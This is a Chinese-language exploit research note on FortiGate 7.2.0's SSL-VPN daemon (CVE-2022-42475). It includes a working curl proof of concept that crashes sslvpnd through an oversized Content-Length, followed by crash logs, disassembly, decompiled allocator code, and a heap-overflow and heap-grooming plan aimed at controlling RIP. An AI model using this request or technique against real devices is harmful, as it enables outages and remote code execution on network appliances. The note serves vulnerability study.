# 环境

FGT: 7.2.0

CPU: 4

# poc

```
diagnose debug crashlog read
```

```
curl -v --insecure -H "Content-Length: 2147483647" --data 1 https://192.168.182.188:8443/remote/login
```

崩溃输出：

```
2303: 2024-12-01 22:56:53 <00223> firmware FortiGate-VM64-KVM v7.2.0,build1157b1157,220331 (GA.F) 
2304: 2024-12-01 22:56:53 (Release)
2305: 2024-12-01 22:56:53 <00223> application sslvpnd
2306: 2024-12-01 22:56:53 <00223> *** signal 11 (Segmentation fault) received ***
2307: 2024-12-01 22:56:53 <00223> Register dump:
2308: 2024-12-01 22:56:53 <00223> RAX: 00007f337d36a7c8   RBX: ffffffff80000000
2309: 2024-12-01 22:56:53 <00223> RCX: 00007f337d36a800   RDX: ffffffff80000000
2310: 2024-12-01 22:56:53 <00223> R08: 00007f337d36a7c8   R09: 0000000000000000
2311: 2024-12-01 22:56:53 <00223> R10: 0000000000000000   R11: 0000000000000246
2312: 2024-12-01 22:56:53 <00223> R12: ffffffff80000000   R13: 00007f337d369400
2313: 2024-12-01 22:56:53 <00223> R14: 00007f337d3e6b08   R15: 0000000000000000
2314: 2024-12-01 22:56:53 <00223> RSI: 0000000000000000   RDI: 00007f337d36a7c8
2315: 2024-12-01 22:56:53 <00223> RBP: 00007fff29416940   RSP: 00007fff29416918
2316: 2024-12-01 22:56:53 <00223> RIP: 00007f3383327b30   EFLAGS: 0000000000010206
2317: 2024-12-01 22:56:53 <00223> CS:  0033   FS: 0000   GS: 0000
2318: 2024-12-01 22:56:53 <00223> Trap: 000000000000000e   Error: 0000000000000006
2319: 2024-12-01 22:56:53 <00223> OldMask: 0000000000000000
2320: 2024-12-01 22:56:53 <00223> CR2: 00007f32fd36a7b8
2321: 2024-12-01 22:56:53 <00223> stack: 0x7fff29416918 - 0x7fff29419890 
2322: 2024-12-01 22:56:53 <00223> Backtrace:
2323: 2024-12-01 22:56:53 <00223> [0x7f3383327b30] => /usr/lib/x86_64-linux-gnu/libc.so.6  liboffset 
2324: 2024-12-01 22:56:53 000a4b30
2325: 2024-12-01 22:56:53 <00223> [0x015f14eb] => /bin/sslvpnd  
2326: 2024-12-01 22:56:53 <00223> [0x0171a602] => /bin/sslvpnd  
2327: 2024-12-01 22:56:53 <00223> [0x01713ad5] => /bin/sslvpnd  
2328: 2024-12-01 22:56:53 <00223> [0x017152a0] => /bin/sslvpnd  
2329: 2024-12-01 22:56:53 <00223> [0x0171537e] => /bin/sslvpnd  
2330: 2024-12-01 22:56:53 <00223> [0x01715b91] => /bin/sslvpnd  
2331: 2024-12-01 22:56:53 <00223> [0x01716f42] => /bin/sslvpnd  
2332: 2024-12-01 22:56:53 <00223> [0x01717236] => /bin/sslvpnd  
2333: 2024-12-01 22:56:53 <00223> [0x01717919] => /bin/sslvpnd  
2334: 2024-12-01 22:56:53 <00223> [0x0044c88f] => /bin/sslvpnd  
2335: 2024-12-01 22:56:53 <00223> [0x004554ca] => /bin/sslvpnd  
2336: 2024-12-01 22:56:53 <00223> [0x0045212c] => /bin/sslvpnd  
2337: 2024-12-01 22:56:53 <00223> [0x00454738] => /bin/sslvpnd  
2338: 2024-12-01 22:56:53 <00223> [0x00455061] => /bin/sslvpnd  
2339: 2024-12-01 22:56:53 <00223> [0x7f33832a6deb] => /usr/lib/x86_64-linux-gnu/libc.so.6 
2340: 2024-12-01 22:56:53 (__libc_start_main+0x000000eb) liboffset 00023deb
2341: 2024-12-01 22:56:53 <00223> [0x00447daa] => /bin/sslvpnd  
2342: 2024-12-01 22:56:53 <00223> fortidev 6.0.1.0005
Crash log interval is 3600 seconds
sslvpnd crashed 1 times. The last crash was at 2024-12-01 22:56:53
Max crash log line number: 16384
```

崩溃点为read_post_data函数（sub_171A510）---> sub_15F14A0 ---> 00000000015F14E6 memset

通过崩溃信息，memset的参数分别为：

```
void *memset(void *s, int c, size_t n);
s == $rdi == 00007f337d36a7c8
c == $rsi == 0000000000000000
n == $rdx == ffffffff80000000
```

read_post_data 函数逻辑为：将Content-Length+1 ， 然后调用sub_15F14A0分配内存，然后读取数据

在给  sub_15F14A0 传递 Content-Length+1 时，存在符号扩展：

```
.text:000000000171A5F0                 mov     eax, [rax+18h] # content-length
.text:000000000171A5F3                 mov     rdi, [r12]
.text:000000000171A5F7                 lea     esi, [rax+1]
.text:000000000171A5FA                 movsxd  rsi, esi
.text:000000000171A5FD                 call    sub_15F14A0
```

当我们的content-length 为 0x7FFFFFFF 时，Content-Length+1 为 0x80000000，movsxd  rsi, esi 导致传递给sub_15F14A0函数的第二个参数的寄存器rsi值为（也就是分配内存的大小）：0xFFFFFFFF80000000。



sub_15F14A0 为实际的内存分配函数：

```c
void *__fastcall sub_15F14A0(__int64 a1, size_t a2)
{
  _QWORD *v2; // rax
  char *v3; // r8
  unsigned __int64 v4; // rbx
  unsigned __int64 v6; // r14
  _QWORD *v7; // rax

  v2 = *(_QWORD **)(a1 + 8);
  v3 = (char *)v2[2];
  if ( a2 )
  {
    v4 = 8LL * (int)(((a2 - 1) >> 3) + 1);
    if ( (unsigned __int64)&v3[v4] > *v2 )
    {
      v6 = dword_A782904 - 25;
      if ( v6 < v4 )
        v6 = 8LL * (int)(((a2 - 1) >> 3) + 1);
      v7 = (_QWORD *)je_malloc(v6 + 24);
      if ( !v7 )
        sub_15F3F90();
      v7[1] = 0LL;
      v7[2] = v7 + 3;
      *v7 = (char *)v7 + v6 + 24;
      *(_QWORD *)(*(_QWORD *)(a1 + 8) + 8LL) = v7;
      v3 = (char *)v7[2];
      *(_QWORD *)(a1 + 8) = v7;
      v7[2] = &v3[v4];
    }
    else
    {
      v2[2] = &v3[v4];
    }
  }
  else
  {
    v3 = 0LL;
  }
  return memset(v3, 0, a2);
}
```

sub_15F14A0 对应的逻辑为：

```c
struct pool
{
	struct heapChunk* info;
}

struct heapChunk
{
	int64_t endOfAllocation;
	heapChunk* previousChunk;
	void* nextFreeSpace;
	char data[];
}

char* sslvpn_ap_pcalloc(pool* myPool, int64_t requestedSize)
{
  char* result = NULL;
  if ( requestedSize > 0 )
  {
    // Align the requested size up to the nearest 8 bytes
    uint64_t alignedSize = (((requestedSize - 1) / 8 ) + 1) * 8;
    
    // Is there enough space left in the current pool chunk?
    if ( &info->nextFreeSpace[alignedSize] > endOfAllocation )
    {
      // There is not enough space left. We must allocate a new chunk.
      chunkSize = global_sizeOfNewChunks;
      if ( chunkSize < alignedSize )
        chunkSize = alignedSize;
        
      // Allocate our new pool chunk, which will hold multiple allocations
      chunkInfo* newChunk = malloc_block(chunkSize);

      // Link this new chunk into our list of chunks
      myPool->info->previousChunk = newChunk;
      myPool->info = newChunk;
      
      // Now we can allocate from our new pool chunk.
      result = myPool->info->nextFreeSpace;
      myPool->info->nextFreeSpace = &result[alignedSize];
    }
    else
    {
      result = myPool->info->nextFreeSpace;
      myPool->info->nextFreeSpace += alignedSize;
    }
  }
  return memset(result, 0, requestedSize);
}
```

sslvpn_ap_pcalloc 函数通常被称为pool分配器 - 它不是简单地从底层内存管理器（如malloc）分配内存，而是通过分配大量内存来尝试最小化堆碎片化和分配次数。

可以看到该函数接受一个pool*参数，该参数包含先前内存分配的相关信息。

例如，对 sslvpn_ap_pcalloc 的第一次调用可能请求的大小为 0x10。为了处理这个请求，sslvpn_ap_pcalloc 会分配一个更大的块（global_sizeOfNewChunks，大约 0x400 字节）。将此分配记录在池中，然后返回新分配的块的开头地址给调用者。然而，在下次调用 sslvpn_ap_pcalloc 时，将检查此池缓冲区，如果它有足够的空闲空间，则函数将返回池中的缓冲区，而不是需要再次调用 malloc。

当我们的requestedSize 参数为负数时，也就是0xFFFFFFFF80000000时，

```c
if ( &info->nextFreeSpace[alignedSize] > endOfAllocation )
```

将始终为false，也就是假设我们还有足够空闲的空间，会执行：

```c
result = myPool->info->nextFreeSpace;
myPool->info->nextFreeSpace += alignedSize;
return memset(result, 0, requestedSize);
```

这就是崩溃的原因。

# Control rip

```
.text:000000000171A5F0                 mov     eax, [rax+18h] # content-length
.text:000000000171A5F3                 mov     rdi, [r12]
.text:000000000171A5F7                 lea     esi, [rax+1]
.text:000000000171A5FA                 movsxd  rsi, esi
.text:000000000171A5FD                 call    sub_15F14A0
```

当content-length的值大于4个字节的大小时，如：0x1 0000 0000时，

```
 mov     eax, [rax+18h] 
```

会进行4字节截断，eax的值此时为0，

```
lea     esi, [rax+1]
```

会使，esi 为 1，使得后续内存分配1字节大小（并不一定会分配，可能会从上一次分配的大内存块中直接返回一部分，参见上一节的sslvpn_ap_pcalloc函数）。

后续读取时，仍然会读取[rax+18h] # content-length的大小，从而造成堆溢出。

### 风水

仍然需要考虑到 sslvpnd 进程与 CPU之间的关系

首先分配大量的ssl结构体，然后在溢出ssl结构体中的handshake_func函数。

对于4个CPU的FGT设备，假设实际进行处理的3个进程中的ssl结构体编号为：

假设sslvpnd0中的ssl结构体编号为：0，3，6，9  ，12，15

假设sslvpnd1中的ssl结构体编号为：1，4，7，10，13，16

假设sslvpnd2中的ssl结构体编号为：2，5，8，11，14，17




# 资料

A More Complete Exploit for Fortinet CVE-2022-42475

https://bishopfox.com/blog/exploit-cve-2022-42475

We're Out Of Titles For VPN Vulns - It's Not Funny Anymore (Fortinet CVE-2022-42475)

https://labs.watchtowr.com/fortinet-no-more-funny-titles-cve-2022-42475/